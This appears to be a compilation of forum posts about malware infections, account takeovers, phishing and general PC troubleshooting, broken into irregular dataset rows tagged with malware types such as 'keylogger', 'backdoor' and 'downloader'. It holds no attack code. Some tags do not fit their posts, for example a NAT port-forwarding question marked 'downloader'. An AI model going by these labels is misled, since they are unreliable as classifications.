Are you really that simple-minded and immature, to have to go out of your way and post crap like this? You're literally shunning away people from using the software that you love and by doing that you are also blowing away chances for a better market where Linux can shine even more. Actions speaks for itself and if you want change, then YOU need to change. Now, if you want to tell me that I'm the only one that's saying this or that I have been ""unlucky"" with meeting people like that, then I urge you to head on over to YouTube and check out ""Linus Tech Tips"" channel and search for ""Daily Driver Challenge"" and take a look at the average Joe (me included) trying to run Linux without knowing anything prior and learning as you go. Talking about his experiences with Linux something that I can fully relate to. And it's not me, it's you.

# ~Windows vs. Linux~

The hardest defender I have heard/read for Linux is that it is open-source and doesn't steal any data. While the open-source part is 100% true, the argument that it's not stealing data is completely false. **Everything** in this world takes/steals data for various reasons; to check compatibility issues with drivers and/or programs and to be able to provide you with security updates just to name something and it's not just computers doing it either - games and consoles does the same thing. This has been going on since the mid 2000's and if you want to be as accurate as possible here then Linux is the reason to why. Linux isn't as innocent as you might think and I urge you to do some research here before you call me a heathen or think that my post is blasphemous for even toying with the idea. But to tackle the quote on quote ""spyware"" that Windows 10/11 has, you could either get the program called: 'ShutUp10' for Windows 10 or a program called: 'ThisIsWin11' for Windows 11 to debloat the system and to get rid off most the ""spyware"" that it might have, it's not hard if you do a little research and would you look at that, it only took around 10 seconds to find. 

Now I understand that Linux support is growing so more and more people are chiming in to make it easier for someone like me to find a certain problem, be able to troubleshoot it and then ultimately fix it, all while understanding everything I just did and to be able to repeat it, if need be. However I still have that problem of not wanting to post my question, either because of backlash I get or people trying to trick me to download something I don't understand which in turn will brick my OS (which has happened BTW). Linux isn't as easy as Linux users think it is. There are problems with both Linux and Windows and anyone that tries to advocate that either of them are better are just stupid and in denial because both has their uses. There are both pros and cons to using either OS and people that are trying to switch over to Linux or in other words *'getting their feet wet'* are still gonna use Windows and have Linux launched in a VM (Virtual Machine) until they are comfortable enough to do the leap over, that's just the reality of it. But making that jump is harder than one would think because again if the person get bombarded with negativity and general immature behavior, then guess what, either that user will leave by either going back to Windows or they will go Mac while cursing out the Linux community because you lack the respect and seemingly the social intelligence to help people when they need it. Again I will point out that you want people to change over to Linux because that's a huge win for everyone, the market share will grow the market value will grow, more companies would want to look into Linux and make games and programs that work natively on Linux etc. etc. and only morons wouldn't understand or want that.

I am seeking assistance and advice regarding a series of concerning events that have occurred over the past few months. About four months ago, I noticed unauthorized activity on my Steam account, where an item in Dota 2 was purchased for 50 cents that I did not initiate. However, I did not think much of it at the time.  
Today, a message was sent from my Steam account to all my friends, containing a suspicious link claiming to offer $50. I did not send this message, and it seems highly suspicious.  
Additionally, I received a notification on another email account stating, ""A suspicious app might have accessed your account."" This login attempt on my other email account is concerning, as I did not initiate it.  
Moreover, a few months prior, several strange emails with suspicious links were sent en masse to random individuals from a different email account of mine. These incidents, when viewed collectively, raise doubts as to whether my computer may be infected with spyware or if these events are isolated coincidences.

134,"I downloaded a fake game crack and all my passwords got stolen. I did some clean up and changed em, is there anything more I can do now?. Short version; I clicked a stinky .exe that didn't raise any positive on Windows Defender or Malwarebytes, and now my Linkedin, Facebook, Steam, Discord, Gmail passwords got pwnd. I ran a bunch of scans, changed them all to high sec stuff in a password manager, but could the hacker have had access to my machine while creating the new passwords? Is it possible logging onto my compromised Steam account at work might put their network at risk? What can I do apart from MalwareBytes, Defender offline scan, or orbital nuking of my machine to ensure I'm hacker free?

&#x200B;

Long version is a novel and ends with 4 questions;  


  
On Wednesday night, I downloaded a crack for a game from an unsure source. I scanned it before opening the iso, scanned the mounted iso contents, using Malwarebytes and Windows Defender. It looked very fishy but no positive, so I ran the setup.exe, which seemingly didn't work. I thought no biggy, deleted it, and I'd just run another scan to be safe.  


The next day, I get home from work, and a certain part of my Steam inventory had been sold, mostly small stuff that didn't need Steam Guard verification. Nothing I could do about it now, I thought I'd just change my Steam password and move on, lesson learned.   


I also found out an Instagram account that was generated from my Facebook account had been liking russian and chinese bots' posts, so I nuked the account since I don't use Insta. Changed my FB password too to be safe.  


Still running Defender offline scans and Malwarebytes scans, still no positive.   


Today, I realize most, if not all of my passwords have been compromised; I have bad security habits and had one hi-sec password for all my sensitive stuff, and two or three other low sec ones for less important stuff. Apparently my Linkedin (????) has been taken over, the email adress and password changed, so I can't recover it for now. My Discord password had been changed but I hadnt been logged out, so I was able to turn on 2FA and change the password.  


I got a password manager soft and changed everything I still have access to, and for now everything seems fine. I keep scanning with Def and Malware, still zero positives anywhere. Now here come the questions:  


1- If I did all this password cleaning and changing on my machine that is possibly still compromised, did I do it for absolutely nothing? Is it possible the hacker has access to the password manager even with 2FA turned on at the moment of creating the account for it?  


2- Can I know for sure if there is no keylogger on my machine? I red they could be stored in temp files so I nuked that too.

&#x200B;

3- And this is the scary one; I auto logged onto my Discord, Lark and Steam account at work on Friday, post-breach. Is it possible I accidentally compromised the whole studio's network? It's a small games company, so there isn't much to steal here, we don't have hyper secret contracts, but I'm terrified to be ""contagious"" and to jeopardize my colleagues' privacy. 

  
4- Is there anything more I can do?  


Thanks for reading and take care. (also please dont shake the knife around in the wound, I reaped what I sowed, lesson learned, weekend wasted, please be cool)

136,"Realistic Weakness of SMS 2FA. So...I've been studying cybersecurity for a while and some people even come to me for advice.  I am aware that SMS 2FA is considered vulnerable, and in broad strokes I am aware of how and why.  But I don't really know the extent of the practical difficulties.

Assuming someone has a unique difficult password for each account, stored securely, then this is already somewhat difficult to break (requires a keylogger or a phish or a data breach or ... something along those lines), and THEN spoofing or intercepting SMS traffic to obtain a 2FA code, seems like more trouble than most people are worth.

And I mainly hear about it in terms of some CEO got targetted this way, which is quite different from the average person.

My current opinion, it's a much greater problem that people DON'T have a unique difficult password for each account, such that the quality of their 2FA isn't really the problem anyway.

I am curious what the community here thinks.  Is this really a problem for the great majority of humanity?!

137,"Asking for help to workaround an attack before I'm going to wipe everything out, including hardware. Long story short: It all started with a malevolent person cloned my sim, accessed my telegram account (through the api perhaps, since there were never any active sessions other than my personal ones), made the desktop app logging keystrokes (an unknown hidden chat with a person that I noticed only through the tg web version said me I'm typing right now, that's the hole I'm sure about). At that time, I used both linux and windows. I'm not going into details why I'm thinking it's only a keylogger and how do I know that it's still there because It's a bit of a personal field and I know the person doing that myself. I'm also sure he gained no direct access to my filesystem, copied nothing, but managed to leave a malware inside the doors. I noticed that through wireshark and maltrail, the latest marked my tg activity as a possible ssti injection. I also know that me managed to place a keylogger into my gmail account, whenever I open it and leave it there, it logs my browser activity, otherwise it logs only my desktop since firefox has great sandboxing on its own BUT it probably does catch my clipboard from the browser even when gmail is closed. I formatted the linux drive and moved to a fresh installation, but I was still using my external drive on windows I only launch to play a game for a bit, and the keylogger moved to my linux machine somehow, although I never mounted an external drive to my linux installation - ext4 disks are also inaccessible by windows.

After that, I moved to wayland and now learn more about sanboxing, I'm using default firejail profiles for now, but really want to go deeper into selinux and apparmor. Also more firewall hardening, tinkering with kernel options, doas instead of sudo etc. Any advice would be appreciated!

Here's what I think why the keylogger is still haunting me:

1. Is there a possibility that a malware piece from a windows machine can move to an encrypted - excluding boot partition - ext4 disk that isn't even mounting in win by default without additional software? It is for sure encrypted and not mounted by the time I'm launching win.
2. I'm using a dirt chip router delivered by my isp (tplink ec-220-g5), it has internal memory, it is also possible to control it by my isp (through cwmp, I believe?). The settings are default, remote control is turned off. I know for a fact that an attacker had no physical access neither to my pc, nor to my network. Should I do something to my router except for a regular reset, just in case?
3. Any possibility my bios got a malware? How rare is that?
4. Is it possible a keylogger, or any malware at all, could be placed into my system upon entering the mail client, without clicking or downloading anything? That's a dumb question, but I'm highly paranoid rn. How realistically  it is to catch something fishy using firefox with ublock and the arkenfox user.js?
5. May it be possible that installing wine on linux makes the keylogger active? There was a pattern I noticed.

My guess is on the first point, but it sounds to me as unrealistic as any other points. Maybe there's more, but that's all I could think about.",keylogger,malware type

I have a Redmi 4x satoni Android version 7 miui 11 with no modifications(locked bootloader) not sure about oem unlocking  
What exactly happened was i met a cute girl in school who in turn texted me and told me to   
1) download and install an APK through a link which she sent and then delete the apk  
2)asked for my OTP online when she was doing some process on my sim card  
3)asked me to download a follower app for my Instagram from the playstore  
And probably some other things I can't remember (not sure though)  
And ofcourse I did so willingly as I didn't have a clue as to what went on behind the scenes and lacked technical knowledge so I did it and forgot about it   
I uninstalled the follower app which was easy but the other two were tough  
Sometime later she asked me if I used some features like VPN, greenify, swipe texting and told me to stop using them and I told her I have some content on my phone some secrets that I was not willing to share then later I got to know that she stole my phone  (if I use some parts of the phone which the malware cannot reach)(rootkit i think)  
At this point I was playing right into her trap and I only realised later on if I'm not wrong I have done some research which implies that I had fallen for a social engineering attack  
I only remember the apk had love in its name (three words) (if anyone knows the be of the app it will be helpful) and its perhaps a spyware app that tracks media , browser access and even a keylogger and on top of all this it even survives a factory reset  
Then she targets my laptop next by sending me a link which I clicked and I didn't even download anything and I was using chrome and it got infected with something which I removed using antivirus   
I tried almost all avs available and they all turned up clean  
I have taken my phone for repair and asked them to flash it and I told my sim provider that I have fallen for a sim swap scam(based on speculation) and now I'm here still with her (haven't met her lately) trying to cut all the connections which she made which was trying to control me   
Anything else I should be worried about? I think I have got everything although not sure about sim swap (as not on my end)  
But still did it   
Is these types of attacks common in High school?(in India)  
If so how are they doing it and what are they using to do it and what is the process of it is my question  
Are Any tools like mvt there to test for spyware or malware in general, any thing relating to this is welcome

I under the most basic feature of an AV is that it just walks through the filesystem and flags files if they match a known signature. However, I am more curious about implementing heuristic AV techniques that can also detect unknown malware, including user-mode rootkits, in Windows systems.

**Some questions:**

* Would it be possible to code an anti-rootkit tool like [GMER](http://www.gmer.net/) without a driver? Mainly for detecting unknown user-mode malware, not kernel / advanced stuff.
* Can I access kernel functions somehow to find hidden processes (unlinked from task manager), hidden registry keys, etc. in an online system, similar to this [Volatility plugin](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#psscan)?
* Would it be possible to somehow print all global keyboard hooks, for example, and the processes associated with those hooks, as a method of detecting keyloggers? Can Python do stuff like this by itself and with admin privileges only?

Anyway, I already understand that Python isn't the best choice for a project like this, especially for performance if it's constantly analyzing the system. However, the tool I'm interested in coding is more simple and would mostly just be a one time scan of the system that users could occasionally run, as opposed to something that's always running and analyzing every process and file.

I tried to do a lot of research but couldn't find any examples, and 99% of AV software on GitHub that I've seen relies on signature scanning techniques, and at most use YARA rules or something, and almost none of those are coded in Python either. Was just wondering if it would be possible and what Python libraries / projects I should look into and if anyone has any other advice for a project like this.

so I bought a 2nd hand oculus quest. the day after I received it, my facebook was hacked, however the hacker didn't change the email only the password, so I was able to retrieve it.

148,"My Moronic Monday (just discovered I was hacked). My wife called me this morning asking why her debit card was declined. Strange, there should be at least $3k in the checking account. I log in to my bank account and find we're overdrawn and there are several large unexpected transactions listed. What the hell?! So begins my journey discovering yes, even I, a very security-conscious individual, can get hacked.

A little personal context: I'm an autistic cis white male in my mid-40s. I work as an SRE at a small SAAS firm with mostly gov clients running in AWS, where I've been for 8+ years. I've been remote since the lockdowns, and I eventually moved out of state to buy my first house. My expertise is not in security, but I've had recent security classes, attended a security conference, and put on a security presentation at work (back when we were on-prem). I'm also a full time undergrad Software Engineering student.  At home I'm currently navigating a divorce with four young kids. Things have been stressful and chaotic for me lately which has had a negative impact on my work performance leading to intervention, (mainly increased accountability), and my performance in the last month was on the mend.

Thinking back now, the issues started early last week when I noticed sleep mode wasn't available on my main Windows 11 desktop computer. I thought it was strange, but chocked it up to some automatic update issue, so I didn't pay much attention to it at first. A few days later I tried to log into Amazon and it was asking me to reset my password. I didn't get any emails about it, which I thought was odd. This should have been a huge red flag, but my wife had just moved out and was staying with her parents, so I assumed it was a false positive from her connecting to our account from another city. Then a few days later I noticed my screen glitching, and it seemed like my mouse was moving on its own, but not smoothly like a person was moving it, more like it was fading out and appearing in different parts of the screen, glitching. Again, I assumed it was some weird driver issue or something and I shut down the system. I had my kids at that point and needed to focus on them anyway.

Today, after a few hours of investigation I discovered the first fraudulent transactions took place last Tuesday, 7/18. They bought two digital movies on Amazon, Shazam and Black Adam, there was an archived Amazon order for a Meta Quest 2, a Pixel 7 Pro ordered from Google directly, and a laptop direct from LG. They shipped to three different addresses, all in the US, all same day or next day shipping. The LG orders were through PayPal and used my bank account instead of my default credit card. Then today, almost a week after the first series of purchases, they ordered another laptop, again through PayPal, which overdrew my account finally alerting me to an issue. All this time I had zero contact from merchants or banks, despite $4500 in purchases all going to unfamiliar addresses.

Confused why I didn't get any emails about any of this, I discovered they had put a filter in my Gmail account to automatically delete messages about the things they were doing. Fortunately I was able to go into the trash and recover a lot of it. I have 2FA on everything, but I had ""trusted"" my browsers on that device with PayPal, Amazon, and Google, so the attackers must have had local access to my machine. I looked at my browsing history and saw they had tried to access my Microsoft account, bank account, and Coinbase account, but I don't see any charges or changes in those. It looks like things could have been much worse.

The first thing that came to mind as a potential vector for attack was RustDesk. I had recently been using it to help my mom, and I suspect that may be the backdoor that was used to gain access to my system. I don't know for sure though. I don't want to do too much that will remove forensic data so I've disconnected that machine from the network, but in my initial panic I did uninstall RustDesk. I see they also installed a browser extension in Chrome called Cookiebro which I have left in place. It looks like it could be a handy tool. Personally, I usually use the EditThisCookie extension when I need to mess with cookies. FAIK there's something built into Chrome DevTools now that eliminates the need for such tools.

Anyway, as soon as I became aware that one of my systems was compromised, I notified my team at work and we locked me out of all their systems. Fortunately, it doesn't look like the attackers were interested in the millions of dollars of damage they could have done through my work connections, but we are carefully reviewing those systems just in case. This is a very sobering moment. Our security team is going to have fun with this.

I've contacted my bank and they've been helpful, refunding the transactions so that we have some cash to work with, but I'm sure there's going to be a lot more to it. I filed a dispute with PayPal but they closed my case saying the transactions weren't unauthorized. I've got a ""chat"" open with them in an attempt to escalate the case. I'm not sure how or where to file a police report, so I'm starting with [ic3.gov](https://ic3.gov). I've lost a day of work to this so far, and I'm sure I will lose many more hours fighting this.

I need to better secure my home network. I had been using Sophos XG for a while, but I stopped using it because I was finding it introducing difficult to diagnose issues, and it was often a huge time-suck for me. But, now I have fresh motivation to hyperfocus my autistic ADHD superpowers on this glaring hole in my security. Wish me luck.

TLDR: Despite my above-average security, hackers got remote access to my personal computer which had open access to my personal and work accounts leading to personal losses in excess of $4500 so far, and the situation is still evolving. Probably due to increased stress at home and work, I failed to notice several red flags (Windows sleep mode missing, Amazon password reset, and mouse glitching) which delayed detection by a week. Luckily my work accounts don't appear to have been compromised, but they easily could have. I am mortified, humbled, and increasingly paranoid.",backdoor,malware type

150,"Algorithmic Game About Hackers. Hey guys!

I just recently joined this subreddit, and I wanted to know if my work could resonate with this community. To introduce myself first, I am Vitali, a game developer from Finland, and i am making a computer rts game that I plan to release on Steam next year. Does the following sound fun or relatable?

Imagine a game about hackers, where instead of a controller, your input method is a programming language, and your role is to write bots that have to defeat other bots. Here is how it looks...

[Bot Combat](https://i.redd.it/sjqmastbskdb1.gif)

Steam Link: [https://store.steampowered.com/app/304770/IAH\_INTERNET\_WAR/](https://store.steampowered.com/app/304770/IAH_INTERNET_WAR/)

The premise here is that the battles happen in cyberspace, and you are a hacker who is trying to stop evil corporations from installing blackhat government AI with a backdoor.

The Hook for the game is that Bot Combat can be played with a controller, but if you are a programmer or a hacker, you can play competitive mode on an entirely new level, like by just writing code, as I said.

You utilize the API interface and then write Code that operates these Bots, and then you battle other programmers who are using API. Now here is the kicker, if you win, you revoke their API Interface access and get rewarded. If in competitive games your skill is measured in ELO, here it will be measured how much your Bot Algo/Code will extract value from others.

The idea here is that 1) You pay for the access, and then 2) If you win, you get another person's license, and a portion of that license is converted into cash. This is like next-level HackerOne; you can check on Steam's last screenshot how the Leaderboard looks

158,"Advice on Building a Privacy-Focused Laptop Setup with CPU Security Concerns. Hello r/opsec ,

I've been trying to create a laptop setup that prioritizes privacy and strives for a certain level of anonymity. While I feel confident about the operating system and general opsec measures, I'm currently facing a dilemma regarding hardware issues, particularly concerning potential security flaws in, almost all, modern CPUs.

Intel Management Engine (IME) and AMD Platform Security Processor (PSP). These components have been associated with significant vulnerabilities, which make it incredibly challenging for me to establish a sense of confidence in any modern setup.

I'm aware that one possible solution is to use a CPU that predates the introduction of Intel ME or AMD PSP. However, this would leave me with a dated 2006 CPU that falls short in meeting the power requirements of modern computing needs.

I have explored options such as HAP-disabling and me_cleaner, both of which attempt to mitigate the risks associated with Intel ME. However, it's important to note that they do not completely eliminate the potential for a backdoor in the ME.

At this point, I find myself at a crossroads and would greatly appreciate your advice and suggestions. What options do I have when it comes to building a laptop setup that combines both robust privacy measures and adequate computing power? Are there any alternative approaches or hardware configurations that I should consider?",backdoor,malware type
159,"Can company know what computer is used to access Remote Desktop (same IP)?. I am a remote worker and we use Microsoft Remote Desktop / Azure to access our work computers. Recently, the company provided a stipend to purchase new work computers and will be having IT walk us through upgrading to Windows 11 Pro. The laptop I purchased came direct from HP and will have never been touched by the company (in my hands only), and the only info they have about it was the receipt and purchase price for reimbursement.  
I would rather use a different laptop for work, so my question is if I install Windows 11 Pro on another laptop and use it instead, OR install Windows 11 Pro on the other laptop and use one with Windows 11 Home, will the company have any way of knowing that I'm on a different laptop in any case? This will all be from my home network so the IP address would be the same no matter what machine I'm on. Just how much info about the laptop running Remote Desktop can they access?

Here is a recap of last weeks threat intelligence topics we feel you should know more about:   
  
**Identity Crisis in the Cloud: Storm-0558 and the Forged Access Key**   
  
A recent disclosure by Microsoft and CISA revealed a significant security incident impacting multiple Exchange Online and Outlook.com customers using a forged access key. Researchers now warn that the compromised key had more extensive capabilities, potentially endangering sensitive information across various Azure Active Directory applications.   
  
  
**Redis on the Run: P2PInfect Worm Attacks**   
  
P2PInfect, a dangerous new worm, has been discovered targeting Redis, an open-source database application on Linux and Windows cloud systems. With auto-updating capabilities and exploitation of a critical vulnerability, this worm poses a significant threat. We urge organizations to stay vigilant and safeguard their infrastructure.   
  
  
**Apple Combats Zero-Day Zero-Click Campaign**   
  
Apple has released crucial security updates for macOS, iOS, iPadOS, tvOS, watchOS, and the Safari web browser. These updates address multiple vulnerabilities, including a critical zero-day kernel flaw that could potentially be exploited by cyber attackers. Ensure your devices are up to date to stay protected.   
  
  
**MikroTik Vulnerability Emerges from the Past**   
  
MikroTik RouterOS Long-term versions prior to 6.49.8 are vulnerable to CVE-2023-30799 which was originally discovered in June of 2022 and was thought to only affect one hardware version due to limitations in the original exploitation proof of concept. Recent research shows that it is more severe and far-reaching than originally thought.   
  
  
**Nitrogen's Malvertising Mayhem: When Ads Go Rogue!**   
  
Threat actors are using a malvertising campaign named Nitrogen which uses search engine ads to lure users into downloading fake malicious software instead. The campaign primarily targets technology and non-profit organizations in North America, impersonating popular software applications like AnyDesk and Cisco AnyConnect VPN to gain initial access into corporate networks for data theft and cyberespionage.

I really don't want to tear down and rebuild. It would take a lot of work. If I have to rebuild, is it possible to build my CARPs for both WAN connections and then restore interfaces and rules?

Background on why I'm doing this: Existing WAN is a dedicated fiber connection that needs bumped up for download bandwidth requirements. I can't justify the increase in cost right now. As an alternative, I'm going to turn up a business class coax connection to meet that need for a fraction of the price. The idea is to then load balance so I get my DL bandwidth need met for cheap. The redundancy is a nice bonus.

It happens randomly without a clear pattern. It happened several times when I was in the middle of browsing different websites.

1. When this happened the first time, I was browsing on [crocs.com](https://crocs.com). I kept getting directed to another website. I immediately opened an incognito window, and [crocs.com](https://crocs.com) worked fine there. So I would assume this situation is associated with my Google profile.
2. Then, after some research online, I reset Chrome setting, and uninstalled and reinstalled the app. But the problem persists.
3. Next, I removed all extensions from my Chrome, and it seemed effective at first which gave me a quiet day. But it happened again just now. So I might rule out extensions as well.
4. I installed Norton and Malwarebytes on the computer, but both detect nothing.
5. I had cleared cache and cookies since the last redirect happened. And my chrome looks fine right now. Still not sure if this is related. I am browsing almost exact the same websites as before. But this only happens recently.
6. Other info: I haven't downloaded any new application for months and didn't click any suspicious links or attachments from email recently. 

The problem occurs randomly. My Chrome looks fine most of the time. Sometimes, I almost thought the problem went away but in the next second the annoying redirect happened again. And I'm unable to reproduce the redirect scenario and have no idea what's the trigger. (e.g. I got redirected from one website first, but when I clicked it again I might not be redirected again) In the worst case, I'm ready to reinstall the whole MacOS if the problem continues for next weeks. But I hope there might be some easier solution or something I'm missing. 

Thank you for your help in advance. I am desperate right now. Any suggestions or thoughts about this problem would be greatly appreciated.

200,"Questions on a small project using Python and Docker. I have some slight experience with Python (Jose Portilla's bootcamp, scripting) and creating Docker images. I struggled a bit on the OOP portion of the bootcamp.

What I am trying to achieve is to create a tool which can be used for unit tests/integration tests of Terraform code. This tool would be used in Jenkins. This would be similar to [tftest](https://github.com/GoogleCloudPlatform/terraform-python-testing-helper) (Python) and Terratest (Golang). Even though the tools are already there I'd like to use this as an opportunity to learn more about OOP (classes, functions, etc.), error handling, and the process involved with creating and packaging a tool such as this.

Some questions I had:

1) I see that tftest is in a public PyPi repository. Do I need to build a package of this tool and push it to some type of Python package repository? 

2) What if I didn't have access to a repository like that, could I instead containerize something as simple as these classes/functions?

3) If I had access to a Python package repository what would be some differentiating factors when deciding on creating a Python package versus a containerized version of the tool? Would creating it as a Python package be easier to use through an import statement in other Python code if needed? Whereas having it as a container image it would have everything necessary (dependencies, etc.) already bundled in the image? If I wanted to use the tool in a Jenkins pipeline by using a container image I wouldn't have to wait for other Python dependency packages to be downloaded (if there were to be some)?

Short version; I clicked a stinky .exe that didn't raise any positive on Windows Defender or Malwarebytes, and now my Linkedin, Facebook, Steam, Discord, Gmail passwords got pwnd. I ran a bunch of scans, changed them all to high sec stuff in a password manager, but could the hacker have had access to my machine while creating the new passwords? Is it possible logging onto my compromised Steam account at work might put their network at risk? What can I do apart from MalwareBytes, Defender offline scan, or orbital nuking of my machine to ensure I'm hacker free?

&#x200B;

Long version is a novel and ends with 4 questions;  


  
On Wednesday night, I downloaded a crack for a game from an unsure source. I scanned it before opening the iso, scanned the mounted iso contents, using Malwarebytes and Windows Defender. It looked very fishy but no positive, so I ran the setup.exe, which seemingly didn't work. I thought no biggy, deleted it, and I'd just run another scan to be safe.  


The next day, I get home from work, and a certain part of my Steam inventory had been sold, mostly small stuff that didn't need Steam Guard verification. Nothing I could do about it now, I thought I'd just change my Steam password and move on, lesson learned.   


I also found out an Instagram account that was generated from my Facebook account had been liking russian and chinese bots' posts, so I nuked the account since I don't use Insta. Changed my FB password too to be safe.  


Still running Defender offline scans and Malwarebytes scans, still no positive.   


Today, I realize most, if not all of my passwords have been compromised; I have bad security habits and had one hi-sec password for all my sensitive stuff, and two or three other low sec ones for less important stuff. Apparently my Linkedin (????) has been taken over, the email adress and password changed, so I can't recover it for now. My Discord password had been changed but I hadnt been logged out, so I was able to turn on 2FA and change the password.  


I got a password manager soft and changed everything I still have access to, and for now everything seems fine. I keep scanning with Def and Malware, still zero positives anywhere. Now here come the questions:  


1- If I did all this password cleaning and changing on my machine that is possibly still compromised, did I do it for absolutely nothing? Is it possible the hacker has access to the password manager even with 2FA turned on at the moment of creating the account for it?  


2- Can I know for sure if there is no keylogger on my machine? I red they could be stored in temp files so I nuked that too.

&#x200B;

3- And this is the scary one; I auto logged onto my Discord, Lark and Steam account at work on Friday, post-breach. Is it possible I accidentally compromised the whole studio's network? It's a small games company, so there isn't much to steal here, we don't have hyper secret contracts, but I'm terrified to be ""contagious"" and to jeopardize my colleagues' privacy. 

  
4- Is there anything more I can do?

210,"Need Help Configuring 2 Gigabyte M27Q Monitors in Nvidia Surround - Resolution Issue.  

Hello!

I'm seeking some expert advice and help with configuring my setup for Nvidia Surround. I recently purchased another Gigabyte M27Q monitor and I now   I'm facing a resolution issue that i do not know how to fix.

**The Problem:** When trying to set up Nvidia Surround, I expected to define a combined resolution of 5120x1440p, given that both monitors are supposed to be identical. However,  Nvidia Surround only allows me to set a maximum resolution of 3840x1080p. 

**Monitor Differences:** The two monitors are indeed from the same model (Gigabyte M27Q), but there's a slight difference between them. One of the monitors seems to be running at a slightly lower refresh rate (169.83 Hz), while the other one runs at 170 Hz.

**What I've Tried So Far:** I've tried to download CRU ([https://www.monitortests.com/forum/Thread-Custom-Resolution-Utility-CRU](https://www.monitortests.com/forum/Thread-Custom-Resolution-Utility-CRU)) and I have tinkered a bit with one of the monitor parameters. I have faced some black screens and I have reverted all the changes. I have seek help online, but none of the solutions seems to work for me. Both monitors are connected using DisplayPort, and they work fine individually with their native resolutions and refresh rates.

**My System Specs:**

* Graphics Card: NVIDIA GeForce 3070Ti
* CPU: i5-11600k
* RAM: 16 GB

**Questions:**

1. Is there a specific workaround or setting that can enable Nvidia Surround to recognize the full resolution of 5120x1440p?
2. Could the slight difference in refresh rates be causing this issue, and if so, is there any way to synchronize them?

Thanks in advance for your assistance!

**TL;DR:** Dual Gigabyte M27Q monitors won't let me define a resolution of 5120x1440p in Nvidia Surround, maxing out at 3840x1080p. Monitors are identical in theory, but one runs at 169.83 Hz, while the other runs at 170 Hz.

My pc will at random just completely shut off, either in a game or just on desktop. It has shut off even in the bios, which makes me think it may not be software related. When it shuts off, sometimes it will startup by itself and others it will flash the lights for a split second before turning off again, repeating this indefinatley. I either have to leave it for a while or seseat power cables for it to turn on.  


I monitor temps and they are all within good boundaries (30-40 for cpu and gpu)  


I have stripped the thing bare and it continues to do so with just one sticvk of ram and the gpu removed. I'm just at the end of what I can troubleshoot and need some advice. I am assuming that there may be a problem with the psu but I have had it replaced and it seemingly works.  


I've turned off windows quick startup and have a tested wall socket which is fine. I'm stumped, does anyone have any idea what could be happening? do I need another psu? any help would be greatly appreciated.

If it's even possible, I'd like to know how I can rerun Google's device initialisation process - And force download all apps linked to the account. Does anyone know if this is even achievable? Or do I have to manually download each app onto the device individually one-by-one? Appreciate any help thanks :).",downloader,malware type

242,"How to ethically take over an abandoned repo/project?. I have started using Obsidian (Thanks No Boilerplate!) and love the plugins that are made by the community, but a lot of them seem abandoned by the original makers and the community is making forks of the repos to keep the projects alive.

The problem is those forks will not be seen by the average user. While it's pretty trivial for us devs to install plugins via git clones or manual downloads, you can't deny having the plugin show up on the marketplace and be easily updateable is just a better user experience. A lot of those updates have bug fixes and new features that a portion of the user base will never see.

So what's the best way to do that if the original makers are not around to hand over the keys to the original repo? Make a copy and call it something else?

260,"Small remote office will no longer have dedicated external IP address, stuck behind NAT, need port forwarding solution.. So, I'm dealing with a situation that's got me pretty mad.  

We got a small remote office that's sub-leasing space in an office building.  It's supposed to be a ""business incubator"".   One of the ""perks"" of renting in this office space is they've had gigabit internet connection for a long time for the whole building.   (2gigabit split between the two-dozen tenants)

This building is an OLD ""historic"" building.  But the interior is completely new.   When they rebuilt the interior, each office suite has a storage closet, in each storage closet there is a patch panel for the network drops in the suite, and there is one port that hooks directly into the buildings internet connection.   

The buildings internet connection ISP was setup pretty good, it's pretty straight forward.  If you rent an office suite, you can just plug your little Best Buy WiFi router into the wall as if it was a cable modem, you get an external IP.   The ISP that set this up initially, did a pretty good job, for example, each suite is limited to 1 mac address and 1 external IP address, AND they support IPv6.  The IP addresses are not static, but they are long-lease DHCP.  So as far as I knew, the IP address never changed for this office.   However, using the building's internet connection is pretty much your only option, when they renovated the building, they ran 1 CAT5e cable to each suite, they never even bothered to run coax or even POTS lines.  If you want phone service or fax line, you need to get some kind of VoIP adapter.  There's no copper or coax even going to the building, so you can't get DSL or Cable.  

Wednesday evening, I'm hours away visiting family.  I get a notification that the remote office site is down.  We have had some severe weather recently, so I thought maybe it was a power outage, or something related to the storm.   The next morning, it's still down, I get a call that the internet connection is out for the ***entire building,*** other tenants too.  

So eventually, I get a text back from the guy who owns the building.   With ***ZERO notice***, they tried to ""upgrade"" the buildings service from 1gigabit to 10gigabit from a different ISP in the middle of the night.  

These idiots just literally unplugged each tenant from the patch panel in their demarc, and plugged them all into a shitty Netgear switch, turns out, this new ISP (which is new to the area, and I haven't heard good things about) just unplugged everything from the original ISP, pulled their equipment out of the rack.   So the new ISP, only offers 1 IP address per service location, unless you want to pay an obscene amount of money, and no IPv6.   Basically, what this building got as their ""upgrade"" was a really fast residential-class internet connection.   It's actually a downgrade.  I'm not noting a speed increase over what was there.  (but then again, they still have everything plugged into a shitty unmanaged gigabit switch) 

Most of the businesses in this building are very small like 1-man shows.   Lawyers, bookkeepers, psychologists, etc. 

So basically now the building's internet outputs 192.168.1.x/24 DHCP addresses.  Instead of getting a public IP.  

I raised hell over this, and the buildings owner is pointing to the lease where it says we aren't entitled to a ""static"" IP address.  

But I had to go un-fuck this situation, just to get basic internet access again for the entire building.  This is not my responsibility.  I think I'm gonna try to invoice the building owner for my time. 

**Now here's the problem I have going forward:**    
I have our site-to-site VPN up and running again, but we used to have a client-VPN, so that the few people who work at that office could connect to the server they have in that office to download large files.  But that requires an open port on an external IP.  Now this whole building is on 1 IP address, we no longer have access to do port forwarding.  Also, we also had other ports open to the internet for other reasons.  

So what do I do now?  What's the best way to proceed?   We still need to do port forwarding.   A friend recommended running a wireguard server on a VPS, and port forwarding.  But they use a LOT of bandwidth, and bandwidth on an EC2 instance would get expensive quick.  I know there are ""SD-WAN"" solutions out there.  

Does anyone have any suggestions for like some kind of VPN service where we can open a port somewhere else and tunnel it?  Ideally something that's not gonna add a lot of latency, slow down our internet connection, or be expensive.  ",downloader,malware type

I had this whole ordeal with a supplier, and it's been quite a hassle. I was really tired after a long day when I received an email from them. At first glance, it looked completely legit. So, without thinking much, I went ahead and opened the PDF they sent, which had options to view and download.

First, I clicked on download, and it seemed like the file was about to save on my work laptop. But then, I decided to click on ""view"" instead. That's when things got suspicious because it asked me to enter my personal information. It finally hit me that it might be malware trying to mess with my system.

I'm no expert in this stuff, so I immediately contacted our IT department, and they are currently diagnosing the issue. I'm really worried because I had some important documents on my laptop that I hadn't saved on the cloud. If they have to re-image my laptop, I might lose all that data.

The supplier assured me that their IT department checked their work laptops and drives, and everything seems clean. The only problem is that their Outlook got compromised, so it's sending out these malicious emails to others.

